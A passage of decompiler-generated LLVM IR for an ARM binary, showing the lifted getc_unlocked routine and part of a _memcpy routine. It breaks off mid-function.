  uselistorder label %.thread2, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_19d8c = load i32, i32* @r4, align 4
  store i32 %v3_19d8c, i32* %stack_var_-12, align 4
  %v6_19d8c = load i32, i32* @r5, align 4
  %v9_19d8c = load i32, i32* @lr, align 4
  %v0_19d90 = load i32, i32* @r0, align 4
  %v1_19d90 = add i32 %v0_19d90, 16
  %v2_19d90 = inttoptr i32 %v1_19d90 to i32*
  %v3_19d90 = load i32, i32* %v2_19d90, align 4
  store i32 %v3_19d90, i32* %r2.global-to-local, align 4
  %v1_19d94 = add i32 %v0_19d90, 24
  %v2_19d94 = inttoptr i32 %v1_19d94 to i32*
  %v3_19d94 = load i32, i32* %v2_19d94, align 4
  %v3_19d98 = icmp ult i32 %v3_19d90, %v3_19d94
  store i32 %v0_19d90, i32* @r4, align 4
  br i1 %v3_19d98, label %bb, label %dec_label_pc_19db8

bb:                                               ; preds = %entry
  %v2_19da4 = inttoptr i32 %v3_19d90 to i8*
  %v3_19da4 = load i8, i8* %v2_19da4, align 1
  %v4_19da4 = zext i8 %v3_19da4 to i32
  store i32 %v4_19da4, i32* %r0.global-to-local, align 4
  %v6_19da4 = add i32 %v3_19d90, 1
  store i32 %v6_19da4, i32* %r2.global-to-local, align 4
  store i32 %v6_19da4, i32* %v2_19d90, align 4
  br label %dec_label_pc_19ea4

dec_label_pc_19db8:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r5, align 4
  %v1_19db8 = inttoptr i32 %v0_19d90 to i16*
  %v2_19db8 = load i16, i16* %v1_19db8, align 2
  %v3_19db8 = zext i16 %v2_19db8 to i32
  %v1_19dbc = and i32 %v3_19db8, 131
  %tmp25 = icmp ugt i32 %v1_19dbc, 128
  br i1 %tmp25, label %dec_label_pc_19dd8, label %dec_label_pc_19dc8

dec_label_pc_19dc8:                               ; preds = %dec_label_pc_19db8
  store i32 128, i32* @r1, align 4
  %v0_19dcc = call i32 @__stdio_trans2r_o()
  store i32 %v0_19dcc, i32* %r0.global-to-local, align 4
  %v2_19dd0 = icmp eq i32 %v0_19dcc, 0
  br i1 %v2_19dd0, label %dec_label_pc_19dc8.dec_label_pc_19dd8_crit_edge, label %dec_label_pc_19ea0

dec_label_pc_19dc8.dec_label_pc_19dd8_crit_edge:  ; preds = %dec_label_pc_19dc8
  %v0_19dd8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19dd8

dec_label_pc_19dd8:                               ; preds = %dec_label_pc_19dc8.dec_label_pc_19dd8_crit_edge, %dec_label_pc_19db8
  %v2_19e18 = phi i32 [ %v0_19dd8.pre, %dec_label_pc_19dc8.dec_label_pc_19dd8_crit_edge ], [ %v0_19d90, %dec_label_pc_19db8 ]
  %v1_19dd8 = inttoptr i32 %v2_19e18 to i16*
  %v2_19dd8 = load i16, i16* %v1_19dd8, align 2
  %v3_19dd8 = zext i16 %v2_19dd8 to i32
  store i32 %v3_19dd8, i32* %r2.global-to-local, align 4
  %v1_19ddc = and i32 %v3_19dd8, 2
  %v2_19ddc = icmp eq i32 %v1_19ddc, 0
  br i1 %v2_19ddc, label %dec_label_pc_19e08, label %dec_label_pc_19de4

dec_label_pc_19de4:                               ; preds = %dec_label_pc_19dd8
  %tmp26 = urem i16 %v2_19dd8, 2
  %v1_19de4 = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_19de4
  %v4_19de8 = and i32 %tmp22, 4
  %v5_19de8 = add i32 %v4_19de8, %v2_19e18
  %v1_19dec = add i32 %v5_19de8, 36
  %v2_19dec = inttoptr i32 %v1_19dec to i8*
  %v3_19dec = load i8, i8* %v2_19dec, align 1
  %v4_19dec = zext i8 %v3_19dec to i32
  %v1_19df0 = add nsw i32 %v3_19dd8, -1
  store i32 %v1_19df0, i32* %r2.global-to-local, align 4
  store i32 %v4_19dec, i32* %r0.global-to-local, align 4
  %v2_19dfc = add i32 %v2_19e18, 40
  %v3_19dfc = inttoptr i32 %v2_19dfc to i32*
  store i32 0, i32* %v3_19dfc, align 4
  %v0_19e00 = load i32, i32* %r2.global-to-local, align 4
  %v1_19e00 = trunc i32 %v0_19e00 to i16
  %v2_19e00 = load i32, i32* @r4, align 4
  %v3_19e00 = inttoptr i32 %v2_19e00 to i16*
  store i16 %v1_19e00, i16* %v3_19e00, align 2
  br label %dec_label_pc_19ea4

dec_label_pc_19e08:                               ; preds = %dec_label_pc_19dd8
  %v1_19e08 = add i32 %v2_19e18, 16
  %v1_19e0c = inttoptr i32 %v1_19e08 to i32*
  %v2_19e0c = load i32, i32* %v1_19e0c, align 4
  %v3_19e0c = add i32 %v2_19e18, 20
  %v4_19e0c = inttoptr i32 %v3_19e0c to i32*
  %v5_19e0c = load i32, i32* %v4_19e0c, align 4
  %v9_19e10 = icmp eq i32 %v5_19e0c, %v2_19e0c
  br i1 %v9_19e10, label %dec_label_pc_19e20, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_19e08
  %v2_19e14 = inttoptr i32 %v2_19e0c to i8*
  %v3_19e14 = load i8, i8* %v2_19e14, align 1
  %v4_19e14 = zext i8 %v3_19e14 to i32
  store i32 %v4_19e14, i32* %r0.global-to-local, align 4
  %v6_19e14 = add i32 %v2_19e0c, 1
  store i32 %v6_19e14, i32* %v1_19e0c, align 4
  br label %dec_label_pc_19ea4

dec_label_pc_19e20:                               ; preds = %dec_label_pc_19e08
  %v1_19e20 = add i32 %v2_19e18, 4
  %v2_19e20 = inttoptr i32 %v1_19e20 to i32*
  %v3_19e20 = load i32, i32* %v2_19e20, align 4
  %v7_19e24 = icmp eq i32 %v3_19e20, -2
  br i1 %v7_19e24, label %.thread7, label %dec_label_pc_19e38

.thread7:                                         ; preds = %dec_label_pc_19e20
  %v2_19e28 = or i16 %v2_19dd8, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_19e28, i16* %v1_19dd8, align 2
  br label %dec_label_pc_19ea4

dec_label_pc_19e38:                               ; preds = %dec_label_pc_19e20
  %v1_19e38 = and i32 %v3_19dd8, 768
  %v2_19e38 = icmp eq i32 %v1_19e38, 0
  br i1 %v2_19e38, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_19e38
  %v1_19e40 = load i32, i32* @r5, align 4
  %v3_19e40 = add i32 %v1_19e40, 48
  %v4_19e40 = inttoptr i32 %v3_19e40 to i32*
  %v5_19e40 = load i32, i32* %v4_19e40, align 4
  store i32 %v5_19e40, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_19e38, %bb23
  %v1_19e44 = xor i1 %v2_19e38, true
  call void @__pseudo_cond_branch(i1 %v1_19e44, i32 ptrtoint (i32* @global_var_14854.823 to i32))
  %v0_19e48 = load i32, i32* @r4, align 4
  %v1_19e48 = add i32 %v0_19e48, 8
  store i32 %v1_19e48, i32* %r2.global-to-local, align 4
  %v1_19e4c = inttoptr i32 %v1_19e48 to i32*
  %v2_19e4c = load i32, i32* %v1_19e4c, align 4
  store i32 %v2_19e4c, i32* %r2.global-to-local, align 4
  %v3_19e4c = add i32 %v0_19e48, 12
  %v4_19e4c = inttoptr i32 %v3_19e4c to i32*
  %v5_19e4c = load i32, i32* %v4_19e4c, align 4
  %v9_19e50 = icmp eq i32 %v5_19e4c, %v2_19e4c
  br i1 %v9_19e50, label %dec_label_pc_19e84, label %dec_label_pc_19e58

dec_label_pc_19e58:                               ; preds = %.thread9
  %v2_19e58 = add i32 %v0_19e48, 24
  %v3_19e58 = inttoptr i32 %v2_19e58 to i32*
  store i32 %v2_19e4c, i32* %v3_19e58, align 4
  %v0_19e5c = load i32, i32* @r4, align 4
  store i32 %v0_19e5c, i32* %r0.global-to-local, align 4
  %v2_19e60 = call i32 @__stdio_rfill(i32 %v0_19e5c)
  store i32 %v2_19e60, i32* %r0.global-to-local, align 4
  %v2_19e64 = icmp eq i32 %v2_19e60, 0
  br i1 %v2_19e64, label %dec_label_pc_19ea0, label %dec_label_pc_19e6c

dec_label_pc_19e6c:                               ; preds = %dec_label_pc_19e58
  %v0_19e6c = load i32, i32* @r4, align 4
  %v1_19e6c = add i32 %v0_19e6c, 20
  %v2_19e6c = inttoptr i32 %v1_19e6c to i32*
  %v3_19e6c = load i32, i32* %v2_19e6c, align 4
  %v2_19e70 = add i32 %v0_19e6c, 24
  %v3_19e70 = inttoptr i32 %v2_19e70 to i32*
  store i32 %v3_19e6c, i32* %v3_19e70, align 4
  %v0_19e74 = load i32, i32* @r4, align 4
  %v1_19e74 = add i32 %v0_19e74, 16
  %v2_19e74 = inttoptr i32 %v1_19e74 to i32*
  %v3_19e74 = load i32, i32* %v2_19e74, align 4
  %v1_19e78 = inttoptr i32 %v3_19e74 to i8*
  %v2_19e78 = load i8, i8* %v1_19e78, align 1
  %v3_19e78 = zext i8 %v2_19e78 to i32
  store i32 %v3_19e78, i32* %r0.global-to-local, align 4
  %v5_19e78 = add i32 %v3_19e74, 1
  store i32 %v5_19e78, i32* %v2_19e74, align 4
  br label %dec_label_pc_19ea4

dec_label_pc_19e84:                               ; preds = %.thread9
  %v1_19e84 = inttoptr i32 %v0_19e48 to i16*
  store i32 %v0_19e48, i32* %r0.global-to-local, align 4
  %v2_19e88 = ptrtoint i8* %stack_var_-17 to i32
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_19e90 = call i32 @__stdio_READ(i16* %v1_19e84, i32 %v2_19e88, i32 1)
  store i32 %v5_19e90, i32* %r0.global-to-local, align 4
  %v2_19e94 = icmp eq i32 %v5_19e90, 0
  br i1 %v2_19e94, label %dec_label_pc_19ea0, label %bb24

bb24:                                             ; preds = %dec_label_pc_19e84
  %v4_19e98 = load i8, i8* %stack_var_-17, align 1
  %v5_19e98 = sext i8 %v4_19e98 to i32
  store i32 %v5_19e98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19ea4

dec_label_pc_19ea0:                               ; preds = %dec_label_pc_19e84, %dec_label_pc_19dc8, %dec_label_pc_19e58
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19ea4

dec_label_pc_19ea4:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_19e6c, %dec_label_pc_19de4, %dec_label_pc_19ea0
  %v2_19ea8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19ea8, i32* @r4, align 4
  store i32 %v6_19d8c, i32* @r5, align 4
  store i32 %v9_19d8c, i32* @lr, align 4
  %v1_19eac = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_19eac

; uselistorder directives
  uselistorder i32 %v2_19e0c, { 1, 0, 2 }
  uselistorder i32 %v2_19e18, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_19d90, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 10, 0, 1, 4, 2, 3, 6, 5, 13, 7, 8, 9, 12, 11 }
  uselistorder label %dec_label_pc_19ea4, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_19ea0, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_19ec0 = load i32, i32* %r1.global-to-local, align 4
  %v1_19ec0 = load i32, i32* %r0.global-to-local, align 4
  %v2_19ec0 = sub i32 %v0_19ec0, %v1_19ec0
  %v3_19ec0 = icmp ult i32 %v0_19ec0, %v1_19ec0
  %v4_19ec0 = xor i32 %v1_19ec0, %v0_19ec0
  %v5_19ec0 = xor i32 %v2_19ec0, %v0_19ec0
  %v6_19ec0 = and i32 %v5_19ec0, %v4_19ec0
  %v7_19ec0 = icmp slt i32 %v6_19ec0, 0
  store i1 %v7_19ec0, i1* %cpsr_v.global-to-local, align 1
  %v8_19ec0 = icmp slt i32 %v2_19ec0, 0
  store i1 %v8_19ec0, i1* %cpsr_n.global-to-local, align 1
  %v9_19ec0 = icmp eq i32 %v0_19ec0, %v1_19ec0
  store i1 %v9_19ec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_19ec0, label %dec_label_pc_1a114, label %dec_label_pc_19ec8

dec_label_pc_19ec8:                               ; preds = %entry
  br i1 %v9_19ec0, label %.thread129, label %bb

.thread129:                                       ; preds = %bb153, %.thread128, %bb150, %dec_label_pc_19ec8
  %merge = phi i32 [ %v0_19ec0, %dec_label_pc_19ec8 ], [ %v2_1a1a8, %bb150 ], [ %v11_1a1c4, %bb153 ], [ %v7_1a1c4, %.thread128 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_19ec8
  %v5_19ecc = inttoptr i32 %v1_19ec0 to i8*
  store i8* %v5_19ecc, i8** %stack_var_-8, align 4
  %v8_19ecc = load i32, i32* @lr, align 4
  %v0_19ed0 = load i32, i32* @r2, align 4
  %v2_19ed0 = add i32 %v0_19ed0, -4
  store i32 %v2_19ed0, i32* %r2.global-to-local, align 4
  %v4_19ed0 = sub i32 3, %v0_19ed0
  %v5_19ed0 = and i32 %v4_19ed0, %v0_19ed0
  %v6_19ed0 = icmp slt i32 %v5_19ed0, 0
  store i1 %v6_19ed0, i1* %cpsr_v.global-to-local, align 1
  %v7_19ed0 = icmp slt i32 %v2_19ed0, 0
  store i1 %v7_19ed0, i1* %cpsr_n.global-to-local, align 1
  %v8_19ed0 = icmp eq i32 %v0_19ed0, 4
  store i1 %v8_19ed0, i1* %cpsr_z.global-to-local, align 1
  %v5_19ed4 = icmp slt i32 %v0_19ed0, 4
  br i1 %v5_19ed4, label %bb140, label %dec_label_pc_19ed8

dec_label_pc_19ed8:                               ; preds = %bb
  %v1_19ed8 = urem i32 %v1_19ec0, 4
  store i32 %v1_19ed8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_19ed8 = icmp eq i32 %v1_19ed8, 0
  store i1 %v2_19ed8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19ed8, label %dec_label_pc_19ee0, label %dec_label_pc_19f8c

dec_label_pc_19ee0:                               ; preds = %dec_label_pc_19ed8
  %v1_19ee0 = urem i32 %v0_19ec0, 4
  store i32 %v1_19ee0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_19ee0 = icmp eq i32 %v1_19ee0, 0
  store i1 %v2_19ee0, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_19ec0 to i2
  br i1 %v2_19ee0, label %dec_label_pc_19ee8, label %dec_label_pc_19fbc

dec_label_pc_19ee8:                               ; preds = %dec_label_pc_19ee0, %dec_label_pc_19fb4
  %v0_19f0093 = phi i32 [ %v1_19ec0, %dec_label_pc_19ee0 ], [ %v0_1a0dc76, %dec_label_pc_19fb4 ]
  %v0_19efc92 = phi i32 [ %v0_19ec0, %dec_label_pc_19ee0 ], [ %v0_19fb4, %dec_label_pc_19fb4 ]
  %v0_19ee8 = phi i32 [ %v2_19ed0, %dec_label_pc_19ee0 ], [ %v2_19fac, %dec_label_pc_19fb4 ]
  %v1_19ee8 = add i32 %v0_19ee8, -8
  store i32 %v1_19ee8, i32* %r2.global-to-local, align 4
  %v3_19ee8 = sub i32 7, %v0_19ee8
  %v4_19ee8 = and i32 %v3_19ee8, %v0_19ee8
  %v5_19ee8 = icmp slt i32 %v4_19ee8, 0
  store i1 %v5_19ee8, i1* %cpsr_v.global-to-local, align 1
  %v6_19ee8 = icmp slt i32 %v1_19ee8, 0
  store i1 %v6_19ee8, i1* %cpsr_n.global-to-local, align 1
  %v7_19ee8 = icmp eq i32 %v0_19ee8, 8
  store i1 %v7_19ee8, i1* %cpsr_z.global-to-local, align 1
  %v2_19eec = xor i1 %v6_19ee8, %v5_19ee8
  br i1 %v2_19eec, label %dec_label_pc_19f3c, label %dec_label_pc_19ef0

dec_label_pc_19ef0:                               ; preds = %dec_label_pc_19ee8
  %v1_19ef0 = add i32 %v0_19ee8, -28
  store i32 %v1_19ef0, i32* %r2.global-to-local, align 4
  %v3_19ef0 = sub i32 27, %v0_19ee8
  %v4_19ef0 = and i32 %v3_19ef0, %v1_19ee8
  %v5_19ef0 = icmp slt i32 %v4_19ef0, 0
  store i1 %v5_19ef0, i1* %cpsr_v.global-to-local, align 1
  %v6_19ef0 = icmp slt i32 %v1_19ef0, 0
  store i1 %v6_19ef0, i1* %cpsr_n.global-to-local, align 1
  %v7_19ef0 = icmp eq i32 %v1_19ee8, 20
  store i1 %v7_19ef0, i1* %cpsr_z.global-to-local, align 1
  %v2_19ef4 = xor i1 %v6_19ef0, %v5_19ef0
  br i1 %v2_19ef4, label %dec_label_pc_19f28, label %dec_label_pc_19ef8

dec_label_pc_19ef8:                               ; preds = %dec_label_pc_19ef0
  %v0_19ef8 = load i32, i32* @r4, align 4
  store i32 %v0_19ef8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_19efc

dec_label_pc_19efc:                               ; preds = %dec_label_pc_19efc.dec_label_pc_19efc_crit_edge, %dec_label_pc_19ef8
  %v0_19f00 = phi i32 [ %v12_19f08, %dec_label_pc_19efc.dec_label_pc_19efc_crit_edge ], [ %v0_19f0093, %dec_label_pc_19ef8 ]
  %v0_19efc = phi i32 [ %v0_19efc.pre, %dec_label_pc_19efc.dec_label_pc_19efc_crit_edge ], [ %v0_19efc92, %dec_label_pc_19ef8 ]
  %v1_19efc = inttoptr i32 %v0_19efc to i32*
  %v2_19efc = load i32, i32* %v1_19efc, align 4
  %v3_19efc = add i32 %v0_19efc, 4
  %v4_19efc = inttoptr i32 %v3_19efc to i32*
  %v5_19efc = load i32, i32* %v4_19efc, align 4
  store i32 %v5_19efc, i32* %r4.global-to-local, align 4
  %v6_19efc = add i32 %v0_19efc, 8
  %v7_19efc = inttoptr i32 %v6_19efc to i32*
  %v8_19efc = load i32, i32* %v7_19efc, align 4
  store i32 %v8_19efc, i32* %ip.global-to-local, align 4
  %v9_19efc = add i32 %v0_19efc, 12
  %v10_19efc = inttoptr i32 %v9_19efc to i32*
  %v11_19efc = load i32, i32* %v10_19efc, align 4
  store i32 %v11_19efc, i32* %lr.global-to-local, align 4
  %v12_19efc = add i32 %v0_19efc, 16
  store i32 %v12_19efc, i32* %r1.global-to-local, align 4
  %v1_19f00 = inttoptr i32 %v0_19f00 to i32*
  store i32 %v2_19efc, i32* %v1_19f00, align 4
  %v3_19f00 = add i32 %v0_19f00, 4
  %v4_19f00 = inttoptr i32 %v3_19f00 to i32*
  %v5_19f00 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_19f00, i32* %v4_19f00, align 4
  %v6_19f00 = add i32 %v0_19f00, 8
  %v7_19f00 = inttoptr i32 %v6_19f00 to i32*
  %v8_19f00 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_19f00, i32* %v7_19f00, align 4
  %v9_19f00 = add i32 %v0_19f00, 12
  %v10_19f00 = inttoptr i32 %v9_19f00 to i32*
  %v11_19f00 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_19f00, i32* %v10_19f00, align 4
  %v12_19f00 = add i32 %v0_19f00, 16
  store i32 %v12_19f00, i32* %r0.global-to-local, align 4
  %v0_19f04 = load i32, i32* %r1.global-to-local, align 4
  %v1_19f04 = inttoptr i32 %v0_19f04 to i32*
  %v2_19f04 = load i32, i32* %v1_19f04, align 4
  store i32 %v2_19f04, i32* @r3, align 4
  %v3_19f04 = add i32 %v0_19f04, 4
  %v4_19f04 = inttoptr i32 %v3_19f04 to i32*
  %v5_19f04 = load i32, i32* %v4_19f04, align 4
  store i32 %v5_19f04, i32* %r4.global-to-local, align 4
  %v6_19f04 = add i32 %v0_19f04, 8
  %v7_19f04 = inttoptr i32 %v6_19f04 to i32*
  %v8_19f04 = load i32, i32* %v7_19f04, align 4
  store i32 %v8_19f04, i32* @ip, align 4
  %v9_19f04 = add i32 %v0_19f04, 12
  %v10_19f04 = inttoptr i32 %v9_19f04 to i32*
  %v11_19f04 = load i32, i32* %v10_19f04, align 4
  store i32 %v11_19f04, i32* %lr.global-to-local, align 4
  %v12_19f04 = add i32 %v0_19f04, 16
  store i32 %v12_19f04, i32* %r1.global-to-local, align 4
  %v1_19f08 = inttoptr i32 %v12_19f00 to i32*
  store i32 %v2_19f04, i32* %v1_19f08, align 4
  %v3_19f08 = add i32 %v0_19f00, 20
  %v4_19f08 = inttoptr i32 %v3_19f08 to i32*
  %v5_19f08 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_19f08, i32* %v4_19f08, align 4
  %v6_19f08 = add i32 %v0_19f00, 24
  %v7_19f08 = inttoptr i32 %v6_19f08 to i32*
  %v8_19f08 = load i32, i32* @ip, align 4
  store i32 %v8_19f08, i32* %v7_19f08, align 4
  %v9_19f08 = add i32 %v0_19f00, 28
  %v10_19f08 = inttoptr i32 %v9_19f08 to i32*
  %v11_19f08 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_19f08, i32* %v10_19f08, align 4
  %v12_19f08 = add i32 %v0_19f00, 32
  store i32 %v12_19f08, i32* %r0.global-to-local, align 4
  %v0_19f0c = load i32, i32* %r2.global-to-local, align 4
  %v1_19f0c = add i32 %v0_19f0c, -32
  store i32 %v1_19f0c, i32* %r2.global-to-local, align 4
  %v3_19f0c = sub i32 31, %v0_19f0c
  %v4_19f0c = and i32 %v3_19f0c, %v0_19f0c
  %v5_19f0c = icmp slt i32 %v4_19f0c, 0
  %v6_19f0c = icmp slt i32 %v1_19f0c, 0
  %v2_19f10 = xor i1 %v6_19f0c, %v5_19f0c
  br i1 %v2_19f10, label %dec_label_pc_19f14, label %dec_label_pc_19efc.dec_label_pc_19efc_crit_edge

dec_label_pc_19efc.dec_label_pc_19efc_crit_edge:  ; preds = %dec_label_pc_19efc
  %v0_19efc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19efc

dec_label_pc_19f14:                               ; preds = %dec_label_pc_19efc
  %v1_19f14 = add i32 %v0_19f0c, -16
  %v3_19f14 = add i32 %v0_19f0c, 2147483616
  %v4_19f14 = and i32 %v1_19f14, %v3_19f14
  %v5_19f14 = icmp slt i32 %v4_19f14, 0
  store i1 %v5_19f14, i1* %cpsr_v.global-to-local, align 1
  %v6_19f14 = icmp slt i32 %v1_19f14, 0
  store i1 %v6_19f14, i1* %cpsr_n.global-to-local, align 1
  %v7_19f14 = icmp eq i32 %v1_19f14, 0
  store i1 %v7_19f14, i1* %cpsr_z.global-to-local, align 1
  %v2_19f18 = xor i1 %v6_19f14, %v5_19f14
  br i1 %v2_19f18, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_19f14
  %v3_19f18 = load i32, i32* %r1.global-to-local, align 4
  %v4_19f18 = inttoptr i32 %v3_19f18 to i32*
  %v5_19f18 = load i32, i32* %v4_19f18, align 4
  store i32 %v5_19f18, i32* @r3, align 4
  %v6_19f18 = add i32 %v3_19f18, 4
  %v7_19f18 = inttoptr i32 %v6_19f18 to i32*
  %v8_19f18 = load i32, i32* %v7_19f18, align 4
  store i32 %v8_19f18, i32* %r4.global-to-local, align 4
  %v9_19f18 = add i32 %v3_19f18, 8
  %v10_19f18 = inttoptr i32 %v9_19f18 to i32*
  %v11_19f18 = load i32, i32* %v10_19f18, align 4
  store i32 %v11_19f18, i32* @ip, align 4
  %v12_19f18 = add i32 %v3_19f18, 12
  %v13_19f18 = inttoptr i32 %v12_19f18 to i32*
  %v14_19f18 = load i32, i32* %v13_19f18, align 4
  store i32 %v14_19f18, i32* %lr.global-to-local, align 4
  %v15_19f18 = add i32 %v3_19f18, 16
  store i32 %v15_19f18, i32* %r1.global-to-local, align 4
  %v4_19f1c = inttoptr i32 %v12_19f08 to i32*
  store i32 %v5_19f18, i32* %v4_19f1c, align 4
  %v6_19f1c = add i32 %v0_19f00, 36
  %v7_19f1c = inttoptr i32 %v6_19f1c to i32*
  %v8_19f1c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_19f1c, i32* %v7_19f1c, align 4
  %v9_19f1c = add i32 %v0_19f00, 40
  %v10_19f1c = inttoptr i32 %v9_19f1c to i32*
  %v11_19f1c = load i32, i32* @ip, align 4
  store i32 %v11_19f1c, i32* %v10_19f1c, align 4
  %v12_19f1c = add i32 %v0_19f00, 44
  %v13_19f1c = inttoptr i32 %v12_19f1c to i32*
  %v14_19f1c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_19f1c, i32* %v13_19f1c, align 4
  %v15_19f1c = add i32 %v0_19f00, 48
  store i32 %v15_19f1c, i32* %r0.global-to-local, align 4
  %v3_19f20 = load i32, i32* %r2.global-to-local, align 4
  %v4_19f20 = add i32 %v3_19f20, -16
  store i32 %v4_19f20, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_19f14, %bb136
  %v3_19f30101110 = phi i32 [ %v15_19f1c, %bb136 ], [ %v12_19f08, %dec_label_pc_19f14 ]
  %v0_19f28.pre = phi i32 [ %v4_19f20, %bb136 ], [ %v1_19f0c, %dec_label_pc_19f14 ]
  %v2_19f24 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19f24, i32* @r4, align 4
  br label %dec_label_pc_19f28

dec_label_pc_19f28:                               ; preds = %dec_label_pc_19ef0, %bb137
  %v3_19f30100 = phi i32 [ %v0_19f0093, %dec_label_pc_19ef0 ], [ %v3_19f30101110, %bb137 ]
  %v0_19f28 = phi i32 [ %v1_19ef0, %dec_label_pc_19ef0 ], [ %v0_19f28.pre, %bb137 ]
  %v1_19f28 = add i32 %v0_19f28, 20
  store i32 %v1_19f28, i32* %r2.global-to-local, align 4
  %v3_19f28 = sub i32 0, %v0_19f28
  %v4_19f28 = and i32 %v1_19f28, %v3_19f28
  %v5_19f28 = icmp slt i32 %v4_19f28, 0
  store i1 %v5_19f28, i1* %cpsr_v.global-to-local, align 1
  %v6_19f28 = icmp slt i32 %v1_19f28, 0
  store i1 %v6_19f28, i1* %cpsr_n.global-to-local, align 1
  %v7_19f28 = icmp eq i32 %v1_19f28, 0
  store i1 %v7_19f28, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19f2c

dec_label_pc_19f2c:                               ; preds = %.thread114, %dec_label_pc_19f28
  %v0_19f3c.pre157 = phi i32 [ %v0_19f3c.pre, %.thread114 ], [ %v1_19f28, %dec_label_pc_19f28 ]
  %v3_19f30 = phi i32 [ %v3_19f3098115, %.thread114 ], [ %v3_19f30100, %dec_label_pc_19f28 ]
  %v1_19f34 = phi i1 [ %v1_19f38, %.thread114 ], [ %v5_19f28, %dec_label_pc_19f28 ]
  %v0_19f34 = phi i1 [ %v0_19f38, %.thread114 ], [ %v6_19f28, %dec_label_pc_19f28 ]
  %v2_19f2c = xor i1 %v1_19f34, %v0_19f34
  br i1 %v2_19f2c, label %.thread114, label %bb138

bb138:                                            ; preds = %dec_label_pc_19f2c
  %v3_19f2c = load i32, i32* %r1.global-to-local, align 4
  %v4_19f2c = inttoptr i32 %v3_19f2c to i32*
  %v5_19f2c = load i32, i32* %v4_19f2c, align 4
  store i32 %v5_19f2c, i32* @r3, align 4
  %v6_19f2c = add i32 %v3_19f2c, 4
  %v7_19f2c = inttoptr i32 %v6_19f2c to i32*
  %v8_19f2c = load i32, i32* %v7_19f2c, align 4
  store i32 %v8_19f2c, i32* @ip, align 4
  %v9_19f2c = add i32 %v3_19f2c, 8
  %v10_19f2c = inttoptr i32 %v9_19f2c to i32*
  %v11_19f2c = load i32, i32* %v10_19f2c, align 4
  store i32 %v11_19f2c, i32* %lr.global-to-local, align 4
  %v12_19f2c = add i32 %v3_19f2c, 12
  store i32 %v12_19f2c, i32* %r1.global-to-local, align 4
  %v4_19f30 = inttoptr i32 %v3_19f30 to i32*
  store i32 %v5_19f2c, i32* %v4_19f30, align 4
  %v6_19f30 = add i32 %v3_19f30, 4
  %v7_19f30 = inttoptr i32 %v6_19f30 to i32*
  %v8_19f30 = load i32, i32* @ip, align 4
  store i32 %v8_19f30, i32* %v7_19f30, align 4
  %v9_19f30 = add i32 %v3_19f30, 8
  %v10_19f30 = inttoptr i32 %v9_19f30 to i32*
  %v11_19f30 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_19f30, i32* %v10_19f30, align 4
  %v12_19f30 = add i32 %v3_19f30, 12
  store i32 %v12_19f30, i32* %r0.global-to-local, align 4
  %v3_19f34 = load i32, i32* %r2.global-to-local, align 4
  %v4_19f34 = add i32 %v3_19f34, -12
  store i32 %v4_19f34, i32* %r2.global-to-local, align 4
  %v6_19f34 = sub i32 11, %v3_19f34
  %v7_19f34 = and i32 %v6_19f34, %v3_19f34
  %v8_19f34 = icmp slt i32 %v7_19f34, 0
